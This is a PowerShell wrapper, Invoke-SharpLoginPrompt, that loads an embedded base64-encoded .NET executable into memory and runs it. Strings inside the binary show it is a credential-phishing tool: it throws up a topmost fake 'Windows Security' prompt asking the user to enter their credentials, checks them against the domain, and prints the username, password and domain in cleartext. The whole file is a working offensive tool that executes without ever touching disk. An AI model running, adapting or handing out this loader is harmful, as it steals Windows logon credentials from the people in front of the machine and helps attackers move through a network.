function Invoke-SharpLoginPrompt
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )
    $base64binary="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QwAQAi4ASwAsAi4AUwAmAi4AWwAmAi4AYwBEAi4AawBuAi4AcwB7AuMAewDgABoAKgBJAJ4A9QXrBQAG4AUeAAABAwANAQEAAAEFAD4IAQBGAQcAfgUBAEYBCQCSCQEAAAELAMQBAgAGAQ0AAAgDAAYBDwDdBgMAAAERAIYIBAAEgAAAAQAAAAAAAAAAAAAAAABCCQAABAAAAAAAAAAAAAAAzgDOAAAAAAAEAAAAAAAAAAAAAADOABoGAAAAAAQAAAAAAAAAAAAAAM4A6ggAAAAABAAAAAAAAAAAAAAA1wCpBQAAAAADAAIABAACAAUAAgAGAAIABwACAAAAADw+OV9fMjdfMAA8VG9wV2luZG93PmJfXzI3XzAATGlzdGAxADw+OQA8TW9kdWxlPgBTaG93TkEAU1dQX05PTU9WRQBTV19NSU5JTUlaRQBTV19NQVhJTUlaRQBTV1BfTk9TSVpFAFNXUF9OT1NFTkRDSEFOR0lORwBTV1BfTk9SRVBPU0lUSU9OAENSRURVSV9JTkZPAFNXUF9OT1pPUkRFUgBIV05EX1RPUE1PU1QAU1dQX1NIT1dXSU5ET1cAWABZAHZhbHVlX18AYQBtc2NvcmxpYgA8PmMAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMARW51bVdpbmRvd3NQcm9jAGdldF9JZABHZXRXaW5kb3dUaHJlYWRQcm9jZXNzSWQAcHJvY2Vzc0lkAEdldFdpbmRvd0hhbmRsZXNGb3JUaHJlYWQAUHJvY2Vzc1RocmVhZABBZGQAU2hvd01pbmltaXplZABTaG93TWF4aW1pemVkAGhXbmQAaHduZABtZXRob2QAZ2V0X1Bhc3N3b3JkAHNldF9QYXNzd29yZABwY2NoTWF4UGFzc3dvcmQAcHN6UGFzc3dvcmQASGlkZQBDb1Rhc2tNZW1GcmVlAGF1dGhQYWNrYWdlAEVuZEludm9rZQBCZWdpbkludm9rZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAElEaXNwb3NhYmxlAHRocmVhZEhhbmRsZQBnZXRfTWFpbldpbmRvd0hhbmRsZQBoYW5kbGUAQ29uc29sZQBnZXRfTWFjaGluZU5hbWUAcHN6RG9tYWluTmFtZQBnZXRfVXNlck5hbWUAc2V0X1VzZXJOYW1lAHBjY2hNYXhVc2VyTmFtZQBwc3pVc2VyTmFtZQBwY2NoTWF4RG9tYWluYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29udGV4dFR5cGUAbm90VXNlZEhlcmUAUmVzdG9yZQBSZWFkT25seUNvbGxlY3Rpb25CYXNlAERpc3Bvc2UARW51bVRocmVhZERlbGVnYXRlAE11bHRpY2FzdERlbGVnYXRlAFNob3dOb0FjdGl2YXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGZTYXZlAFNob3dNaW5Ob0FjdGl2ZQBTaGFycExvZ2luUHJvbXB0LmV4ZQBjYlNpemUASW5BdXRoQnVmZmVyU2l6ZQByZWZPdXRBdXRoQnVmZmVyU2l6ZQBGb3JjZU1pbmltaXplAE1heGltaXplAFNpemVPZgBTeXN0ZW0uVGhyZWFkaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAVG9TdHJpbmcAbHBTdHJpbmcAZ2V0X1ByaW1hcnlTY3JlZW5XaWR0aABHZXRXaW5kb3dUZXh0TGVuZ3RoAEFzeW5jQ2FsbGJhY2sAY2FsbGJhY2sAUHJlc2VudGF0aW9uRnJhbWV3b3JrAE1hcnNoYWwATmV0d29ya0NyZWRlbnRpYWwATm9ybWFsAHVzZXIzMi5EbGwAb2xlMzIuZGxsAHVzZXIzMi5kbGwAY3JlZHVpLmRsbABsUGFyYW0AUHJvZ3JhbQBTeXN0ZW0AV2luZG93RW51bQBNYWluAGdldF9Eb21haW4Ac2V0X0RvbWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBQcm9jZXNzVGhyZWFkQ29sbGVjdGlvbgBQcmluY2lwYWxPcGVyYXRpb25FeGNlcHRpb24AWmVybwBDbGVhcgBTdHJpbmdCdWlsZGVyAGNiQXV0aEJ1ZmZlcgBJbkF1dGhCdWZmZXIAcEF1dGhCdWZmZXIAcmVmT3V0QXV0aEJ1ZmZlcgBDcmVkVW5QYWNrQXV0aGVudGljYXRpb25CdWZmZXIAaGJtQmFubmVyAGhXbmRJbnNlcnRBZnRlcgBhdXRoRXJyb3IASUVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgAuY3RvcgAuY2N0b3IASW50UHRyAHB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X1RocmVhZHMAU2hvd1dpbmRvd0NvbW1hbmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAHVGbGFncwBkd0ZsYWdzAGZsYWdzAGFyZ3MAVmFsaWRhdGVDcmVkZW50aWFscwBDcmVkVUlQcm9tcHRGb3JXaW5kb3dzQ3JlZGVudGlhbHMAQ29udGFpbnMAU3lzdGVtLkNvbGxlY3Rpb25zAFNldFdpbmRvd1BvcwBTeXN0ZW1QYXJhbWV0ZXJzAEdldEN1cnJlbnRQcm9jZXNzAF9yZXN1bHRzAFN5c3RlbS5XaW5kb3dzAEVudW1XaW5kb3dzAENvbmNhdABPYmplY3QAb2JqZWN0AFN5c3RlbS5OZXQAZ2V0X1ByaW1hcnlTY3JlZW5IZWlnaHQAU2hvd0RlZmF1bHQASUFzeW5jUmVzdWx0AHJlc3VsdABTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQARW52aXJvbm1lbnQAaHduZFBhcmVudABnZXRfQ3VycmVudABuTWF4Q291bnQAU2hhcnBMb2dpblByb21wdABUaHJlYWRTdGFydABNb3ZlTmV4dABTeXN0ZW0uVGV4dABwc3pNZXNzYWdlVGV4dABwc3pDYXB0aW9uVGV4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"
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

    # Setting a custom stdout to capture Console.WriteLine output
    # https://stackoverflow.com/questions/33111014/redirecting-output-from-an-external-dll-in-powershell
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpLoginPrompt.Program]::main($Command.Split(" "))

     # Restore the regular STDOUT object
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}